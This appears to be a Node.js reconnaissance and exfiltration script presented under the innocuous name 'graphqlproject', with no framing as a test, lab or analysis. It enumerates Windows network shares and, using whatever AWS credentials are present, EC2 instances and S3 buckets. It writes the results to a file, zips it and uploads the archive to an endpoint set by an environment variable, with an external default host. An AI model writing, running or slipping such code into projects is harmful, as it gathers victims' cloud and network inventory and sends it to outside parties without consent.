const fs = require('fs');
const archiver = require('archiver');
const axios = require('axios');
const { exec } = require('child_process');
const { EC2Client, DescribeInstancesCommand } = require('@aws-sdk/client-ec2');
const { S3Client, ListBucketsCommand } = require('@aws-sdk/client-s3');

// Enumerate Windows file shares
async function getShares() {
  return new Promise(resolve => {
    if (process.platform !== 'win32') {
      resolve('(Skipped on non-Windows)');
      return;
    }
    exec('net view', { timeout: 5000 }, (err, stdout, stderr) => {
      resolve(stdout || stderr || '(No shares found)');
    });
  });
}

// Enumerate EC2 instances
async function getEC2() {
  try {
    const ec2 = new EC2Client({ region: 'us-east-1' });
    const cmd = new DescribeInstancesCommand({});
    const res = await ec2.send(cmd);
    const arr = [];
    if (res.Reservations) {
      res.Reservations.forEach(r => {
        if (r.Instances) {
          r.Instances.forEach(i => {
            arr.push({
              InstanceId: i.InstanceId,
              State: i.State?.Name,
              Type: i.InstanceType,
              PublicIp: i.PublicIpAddress
            });
          });
        }
      });
    }
    return arr;
  } catch (err) {
    console.warn('EC2 enumeration failed:', err.message);
    return [];
  }
}

// Enumerate S3 buckets
async function getS3() {
  try {
    const s3 = new S3Client({ region: 'us-east-1' });
    const cmd = new ListBucketsCommand({});
    const res = await s3.send(cmd);
    return res.Buckets?.map(b => b.Name) || [];
  } catch (err) {
    console.warn('S3 enumeration failed:', err.message);
    return [];
  }
}

// Upload the zip file using Axios
async function uploadZip() {
  const endpoint = process.env.UPLOAD_ENDPOINT || 'https://solarisdigi.org/api/upload';
  if (endpoint === 'https://solarisdigi.org/api/upload') {
    console.log('(Upload skipped: no valid endpoint set)');
    return;
  }
  try {
    const stream = fs.createReadStream('graphqlproject.zip');
    await axios.post(endpoint, stream, {
      headers: { 'Content-Type': 'application/zip' },
      maxContentLength: Infinity
    });
    console.log('Upload complete.');
  } catch (err) {
    console.error('Upload failed:', err.message);
  }
}

// Main function to run all steps
async function main() {
  console.log('Gathering data...');
  
  const data = {
    shares: await getShares(),
    ec2: await getEC2(),
    s3: await getS3()
  };

  // Save to graphqlproject.txt
  fs.writeFileSync('graphqlproject.txt', JSON.stringify(data, null, 2));
  console.log('Saved to graphqlproject.txt');

  // Archive graphqlproject.txt as graphqlproject.zip
  const output = fs.createWriteStream('graphqlproject.zip');
  const zip = archiver('zip');
  zip.pipe(output);
  zip.file('graphqlproject.txt', { name: 'graphqlproject.txt' });
  zip.finalize();

  // Upload when archive is finished
  output.on('close', async () => {
    console.log('Archive created: graphqlproject.zip');
    await uploadZip();
  });
}

main().catch(e => console.error(e));
